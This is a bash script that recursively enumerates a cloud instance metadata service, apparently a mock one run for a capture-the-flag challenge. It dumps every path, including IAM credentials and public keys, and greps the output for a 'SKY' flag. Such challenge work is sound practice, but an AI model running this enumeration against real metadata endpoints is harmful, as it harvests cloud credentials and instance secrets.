#!/bin/bash

BASE="http://metadata.services.cityinthe.cloud:1338/latest/meta-data"

fetch() {
    local path=$1
    local url="$BASE/$path"
    local data=$(curl -s "$url")

    # If the response is empty, just return
    [[ -z "$data" ]] && return

    # Check line by line
    while IFS= read -r line; do
        if [[ "$line" == */ ]]; then
            # recurse into subdirectory
            fetch "$path$line"
        else
            # print value
            echo "=== $path$line ==="
            value=$(curl -s "$BASE/$path$line")
            echo "$value"
            echo "$value" | grep -o 'SKY.*' && echo "[!] Potential flag in $path$line"
            echo
        fi
    done <<< "$data"
}

# start from top-level
paths=(
  "ami-id"
  "ami-launch-index"
  "ami-manifest-path"
  "block-device-mapping/"
  "elastic-inference/"
  "events/"
  "hostname"
  "iam/"
  "instance-action"
  "instance-id"
  "instance-life-cycle"
  "instance-type"
  "kernel-id"
  "local-hostname"
  "local-ipv4"
  "mac"
  "network/"
  "placement/"
  "product-codes"
  "public-hostname"
  "public-ipv4"
  "public-keys/"
  "ramdisk-id"
  "reservation-id"
  "security-groups"
  "services/"
  "spot/"
  "tags/"
)

for path in "${paths[@]}"; do
    fetch "$path"
done
